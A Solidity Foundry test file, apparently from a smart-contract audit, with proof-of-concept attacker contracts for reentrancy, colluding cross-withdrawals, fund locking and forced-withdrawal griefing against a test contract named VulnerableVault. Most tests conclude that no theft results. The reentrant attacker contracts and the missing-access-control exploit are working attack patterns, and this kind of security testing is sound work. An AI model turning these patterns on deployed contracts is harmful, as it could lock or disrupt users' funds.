// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";

// -----------------------------------------------------------------------------
// ADVERSARIAL SPECIALIST POC - execution-trace profile
// -----------------------------------------------------------------------------
//
// Tests the four novel attack vectors requested by Argus:
//
//  VECTOR A: Cross-account reentrancy (attacker re-enters withdraw(otherAddr))
//  VECTOR B: Two colluding contracts cross-withdrawing
//  VECTOR C: deposit() during reentrancy window to refill balances[to]
//  VECTOR D: Permanent fund lock for ETH-rejecting depositors (independent of access control)
//
// All vectors must prove conservation: total ETH in system is constant.
// Theft claim requires attacker_net_gain > 0 after subtracting all attacker-funded inflows.
// -----------------------------------------------------------------------------

// --- VECTOR A: Cross-account reentrant attacker -------------------------------
// AttackerA calls withdraw(A, 1). In receive(), re-enters withdraw(B, 1).
// ETH goes to B (not A). A gains nothing from B's withdrawal.
contract CrossAccountReentrantA {
    VulnerableVault public vault;
    address payable public partnerB;
    bool public reentryDone;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function setPartner(address payable _b) external {
        partnerB = _b;
    }

    function attack() external {
        reentryDone = false;
        vault.withdraw(payable(address(this)), 1 ether);
    }

    receive() external payable {
        if (!reentryDone && partnerB != address(0) && vault.balances(partnerB) >= 1 ether) {
            reentryDone = true;
            // Re-enter: withdraw B's funds - ETH goes to B, not to this contract
            vault.withdraw(partnerB, 1 ether);
        }
    }
}

// --- VECTOR B: Two colluding contracts cross-withdrawing ----------------------
// A calls withdraw(A). In A's receive(), calls withdraw(B). In B's receive(), calls withdraw(A).
// Third withdraw(A) passes stale check but causes underflow on unwind -> REVERT.
contract ColludingAttackerA {
    VulnerableVault public vault;
    address payable public partnerB;
    uint256 public depth;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function setPartner(address payable _b) external {
        partnerB = _b;
    }

    function attack() external {
        depth = 0;
        vault.withdraw(payable(address(this)), 1 ether);
    }

    receive() external payable {
        depth++;
        if (depth == 1 && partnerB != address(0) && vault.balances(partnerB) >= 1 ether) {
            // Cross-call: withdraw B's funds (ETH goes to B)
            vault.withdraw(partnerB, 1 ether);
        }
    }
}

contract ColludingAttackerB {
    VulnerableVault public vault;
    address payable public partnerA;
    uint256 public depth;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function setPartner(address payable _a) external {
        partnerA = _a;
    }

    receive() external payable {
        depth++;
        if (depth == 1 && partnerA != address(0) && vault.balances(partnerA) >= 1 ether) {
            // Re-enter A's withdrawal again - stale check passes but unwind will underflow
            vault.withdraw(partnerA, 1 ether);
        }
    }
}

// --- VECTOR C: deposit() during reentrancy window ----------------------------
// Attacker calls withdraw(self, 1). In receive(), calls deposit{value:1}() to
// re-credit balances[self] before the pending decrement fires.
// This prevents underflow but does NOT produce net gain.
contract DepositInReceiveAttacker {
    VulnerableVault public vault;
    uint256 public reentryCount;
    uint256 public maxReentries;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function attack(uint256 _maxReentries) external payable {
        maxReentries = _maxReentries;
        reentryCount = 0;
        vault.withdraw(payable(address(this)), 1 ether);
    }

    receive() external payable {
        reentryCount++;
        if (reentryCount <= maxReentries && address(this).balance >= 1 ether) {
            // Re-deposit the received ETH to refill balances[this]
            // This prevents underflow on unwind but costs us the ETH we just received
            vault.deposit{value: 1 ether}();
            // Now try to withdraw again - balances[this] was just incremented
            if (vault.balances(address(this)) >= 1 ether) {
                vault.withdraw(payable(address(this)), 1 ether);
            }
        }
    }
}

// --- VECTOR D: ETH-rejecting depositor (fund lock independent of access control) --
contract ETHRejectingDepositorV2 {
    VulnerableVault public vault;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    // No receive() - simulates a multisig or protocol contract without ETH fallback
    // This causes vault.withdraw(this, amount) to always revert
}

// -----------------------------------------------------------------------------
// TEST SUITE
// -----------------------------------------------------------------------------

contract AdversarialSpecialistPoCTest is Test {
    VulnerableVault public vault;
    address payable public alice;

    function setUp() public {
        vault = new VulnerableVault();
        alice = payable(makeAddr("alice"));

        // Alice deposits 10 ETH - victim funds
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        vault.deposit{value: 10 ether}();

        assertEq(address(vault).balance, 10 ether, "setUp: vault holds 10 ETH");
        assertEq(vault.balances(alice), 10 ether, "setUp: alice credited 10 ETH");
    }

    // -------------------------------------------------------------------------
    // VECTOR A: Cross-account reentrancy
    // Attacker A re-enters withdraw(B) during A's own withdrawal.
    // ETH goes to B (not A). A's net gain = 0.
    // -------------------------------------------------------------------------
    function testVectorA_CrossAccountReentrancy_NoTheft() public {
        console2.log("=== VECTOR A: Cross-account reentrancy ===");

        CrossAccountReentrantA attackerA = new CrossAccountReentrantA(vault);
        address payable attackerB = payable(makeAddr("attackerB"));

        // Fund both attackers and deposit
        vm.deal(address(attackerA), 1 ether);
        vm.prank(address(attackerA));
        vault.deposit{value: 1 ether}();

        vm.deal(attackerB, 1 ether);
        vm.prank(attackerB);
        vault.deposit{value: 1 ether}();

        attackerA.setPartner(attackerB);

        // Pre-attack state
        assertEq(address(attackerA).balance, 0, "Pre: A raw balance == 0");
        assertEq(vault.balances(address(attackerA)), 1 ether, "Pre: A vault credit == 1 ETH");
        assertEq(vault.balances(attackerB), 1 ether, "Pre: B vault credit == 1 ETH");
        assertEq(address(vault).balance, 12 ether, "Pre: vault holds 12 ETH");

        uint256 aDepositedTotal = 1 ether;
        uint256 bDepositedTotal = 1 ether;

        attackerA.attack();

        uint256 aRawAfter = address(attackerA).balance;
        uint256 bRawAfter = attackerB.balance;

        console2.log("Post: A raw balance:    ", aRawAfter);
        console2.log("Post: B raw balance:    ", bRawAfter);
        console2.log("Post: A vault credit:   ", vault.balances(address(attackerA)));
        console2.log("Post: B vault credit:   ", vault.balances(attackerB));
        console2.log("Post: vault ETH:        ", address(vault).balance);

        // A received its own deposit back (1 ETH), net gain = 0
        int256 aNetGain = int256(aRawAfter) - int256(aDepositedTotal);
        // B received its own deposit back (1 ETH), net gain = 0
        int256 bNetGain = int256(bRawAfter) - int256(bDepositedTotal);

        assertEq(aNetGain, 0, "VECTOR A: A net gain == 0 (no theft)");
        assertEq(bNetGain, 0, "VECTOR A: B net gain == 0 (ETH returned to rightful owner)");

        // Conservation: vault lost 2 ETH (A's + B's deposits returned)
        assertEq(address(vault).balance, 10 ether, "Conservation: vault holds only alice's 10 ETH");

        console2.log("CONFIRMED: Cross-account reentrancy produces 0 net gain. No theft.");
    }

    // -------------------------------------------------------------------------
    // VECTOR B: Two colluding contracts - A->B->A cross-withdrawal
    // Third withdraw(A) passes stale check but causes underflow on unwind -> REVERT
    // -------------------------------------------------------------------------
    function testVectorB_ColludingContracts_UnderflowReverts() public {
        console2.log("=== VECTOR B: Two colluding contracts cross-withdrawing ===");

        ColludingAttackerA attackerA = new ColludingAttackerA(vault);
        ColludingAttackerB attackerB = new ColludingAttackerB(vault);

        attackerA.setPartner(payable(address(attackerB)));
        attackerB.setPartner(payable(address(attackerA)));

        // Fund both and deposit
        vm.deal(address(attackerA), 1 ether);
        vm.prank(address(attackerA));
        vault.deposit{value: 1 ether}();

        vm.deal(address(attackerB), 1 ether);
        vm.prank(address(attackerB));
        vault.deposit{value: 1 ether}();

        assertEq(address(attackerA).balance, 0, "Pre: A raw == 0");
        assertEq(address(attackerB).balance, 0, "Pre: B raw == 0");
        assertEq(address(vault).balance, 12 ether, "Pre: vault holds 12 ETH");

        // The A->B->A chain: third withdraw(A) will underflow balances[A] on unwind
        vm.expectRevert();
        attackerA.attack();

        // State completely unchanged - no ETH extracted
        assertEq(address(attackerA).balance, 0, "Post-revert: A extracted 0 ETH");
        assertEq(address(attackerB).balance, 0, "Post-revert: B extracted 0 ETH");
        assertEq(vault.balances(address(attackerA)), 1 ether, "Post-revert: A vault credit unchanged");
        assertEq(vault.balances(address(attackerB)), 1 ether, "Post-revert: B vault credit unchanged");
        assertEq(address(vault).balance, 12 ether, "Post-revert: vault balance unchanged");

        console2.log("CONFIRMED: Colluding A->B->A cross-withdrawal reverts. No ETH extracted.");
    }

    // -------------------------------------------------------------------------
    // VECTOR C: deposit() during reentrancy window
    // Attacker re-deposits received ETH to prevent underflow.
    // This allows the transaction to succeed but produces ZERO net gain.
    // Conservation proof: every ETH received is immediately re-deposited.
    // -------------------------------------------------------------------------
    function testVectorC_DepositInReceive_ZeroNetGain() public {
        console2.log("=== VECTOR C: deposit() during reentrancy window ===");

        DepositInReceiveAttacker attacker = new DepositInReceiveAttacker(vault);

        // Fund attacker with 1 ETH and deposit it
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        vault.deposit{value: 1 ether}();

        assertEq(address(attacker).balance, 0, "Pre: attacker raw == 0");
        assertEq(vault.balances(address(attacker)), 1 ether, "Pre: attacker vault credit == 1 ETH");

        uint256 totalDeposited = 1 ether; // initial deposit

        console2.log("Pre-attack attacker raw:    ", address(attacker).balance);
        console2.log("Pre-attack attacker credit: ", vault.balances(address(attacker)));
        console2.log("Pre-attack vault ETH:       ", address(vault).balance);

        // Attack: withdraw(self, 1), in receive() deposit(1) then withdraw(self, 1) again
        // maxReentries=2: attacker will try to cycle twice
        // Each cycle: receive 1 ETH, re-deposit 1 ETH, withdraw 1 ETH again
        attacker.attack{value: 0}(2);

        uint256 attackerRawAfter = address(attacker).balance;
        uint256 attackerCreditAfter = vault.balances(address(attacker));

        console2.log("Post-attack attacker raw:    ", attackerRawAfter);
        console2.log("Post-attack attacker credit: ", attackerCreditAfter);
        console2.log("Post-attack vault ETH:       ", address(vault).balance);

        // The attacker's net position: raw ETH + vault credit vs total deposited
        // Total deposited = initial 1 ETH + any re-deposits during reentrancy
        // Total received = ETH in raw balance
        // Net gain = raw_after - total_deposited_from_attacker_funds
        // Since attacker started with 1 ETH and all re-deposits come from received ETH:
        // net gain = attackerRawAfter - 1 ether (initial deposit)
        int256 netGain = int256(attackerRawAfter) - int256(totalDeposited);

        console2.log("Attacker net gain (signed): ");
        if (netGain >= 0) {
            console2.log("  +", uint256(netGain));
        } else {
            console2.log("  -", uint256(-netGain));
        }

        // CORE ASSERTION: net gain must be <= 0
        // (attacker cannot extract more than it deposited from its own funds)
        assertLe(netGain, 0, "VECTOR C: deposit-in-receive produces net gain <= 0");

        // Conservation: alice's funds untouched
        assertEq(vault.balances(alice), 10 ether, "Conservation: alice vault credit unchanged");

        console2.log("CONFIRMED: deposit-in-receive trick produces zero net gain.");
        console2.log("Every ETH received is re-deposited; conservation holds.");
    }

    // -------------------------------------------------------------------------
    // VECTOR D: Permanent fund lock - ETH-rejecting depositor
    // Independent of access control: even the depositor itself cannot withdraw.
    // This is a CONFIRMED High severity finding.
    // -------------------------------------------------------------------------
    function testVectorD_PermanentFundLock_IndependentOfAccessControl() public {
        console2.log("=== VECTOR D: Permanent fund lock (independent of access control) ===");

        ETHRejectingDepositorV2 victim = new ETHRejectingDepositorV2(vault);

        // Victim deposits 5 ETH
        vm.deal(address(victim), 5 ether);
        vm.prank(address(victim));
        vault.deposit{value: 5 ether}();

        assertEq(vault.balances(address(victim)), 5 ether, "Victim credited 5 ETH");
        assertEq(address(vault).balance, 15 ether, "Vault holds 15 ETH");

        console2.log("Victim vault credit:  ", vault.balances(address(victim)));
        console2.log("Victim raw balance:   ", address(victim).balance);

        // Attempt 1: Victim tries to withdraw its OWN funds (authorized call)
        // Even with correct access control (msg.sender == to), this would fail
        // because victim has no receive() - the push-payment model is broken
        vm.prank(address(victim));
        vm.expectRevert();
        vault.withdraw(payable(address(victim)), 1 ether);

        // Attempt 2: Third party tries to force-withdraw (access control bug)
        address thirdParty = makeAddr("thirdParty");
        vm.prank(thirdParty);
        vm.expectRevert();
        vault.withdraw(payable(address(victim)), 1 ether);

        // Funds permanently locked - NEITHER the victim NOR a third party can withdraw
        assertEq(vault.balances(address(victim)), 5 ether, "Victim vault credit LOCKED - unchanged");
        assertEq(address(victim).balance, 0, "Victim raw balance == 0 - ETH stuck in vault");
        assertEq(address(vault).balance, 15 ether, "Vault balance unchanged - ETH permanently locked");

        console2.log("CONFIRMED: ETH-rejecting depositor has funds permanently locked.");
        console2.log("This is independent of the access control bug.");
        console2.log("Even with msg.sender == to check, victim cannot withdraw.");
        console2.log("Root cause: push-payment model (to.call) incompatible with non-payable contracts.");
    }

    // -------------------------------------------------------------------------
    // VECTOR E: Forced withdrawal griefing - access control missing
    // Any caller can force-withdraw any user's balance to that user's address.
    // Caller gains 0. Victim's vault state disrupted without consent.
    // -------------------------------------------------------------------------
    function testVectorE_ForcedWithdrawal_GriefingNotTheft() public {
        console2.log("=== VECTOR E: Forced withdrawal griefing ===");

        address eve = makeAddr("eve");

        assertEq(vault.balances(eve), 0, "Eve has no vault balance");
        assertEq(address(eve).balance, 0, "Eve has no raw ETH");

        // Eve force-withdraws alice's entire balance to alice's address
        vm.prank(eve);
        vault.withdraw(alice, 10 ether);

        // Alice received her own ETH back (not stolen)
        assertEq(alice.balance, 10 ether, "Alice received her own ETH");
        assertEq(vault.balances(alice), 0, "Alice vault credit zeroed without consent");

        // Eve gained nothing
        assertEq(address(eve).balance, 0, "Eve net gain == 0 (griefing, not theft)");

        int256 eveNetGain = int256(address(eve).balance) - int256(0);
        assertEq(eveNetGain, 0, "CONFIRMED: forced withdrawal is griefing, not theft");

        console2.log("CONFIRMED: Forced withdrawal sends ETH to victim, not caller.");
        console2.log("Eve net gain = 0. This is griefing/DoS, not theft.");
    }
}
